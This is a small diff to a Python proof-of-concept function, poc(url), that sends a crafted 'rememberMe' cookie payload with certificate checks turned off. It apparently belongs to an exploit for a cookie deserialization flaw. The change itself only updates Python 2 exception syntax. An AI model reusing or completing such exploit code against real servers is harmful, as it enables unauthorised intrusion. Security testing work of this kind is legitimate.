@@ -45,7 +45,7 @@ def poc(url):
         #print payload.decode()
         #exit()
         r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10,verify=False)  # 发送验证请求
-    except Exception, e:
+    except Exception as e:
         #print(e)
         pass
     return False
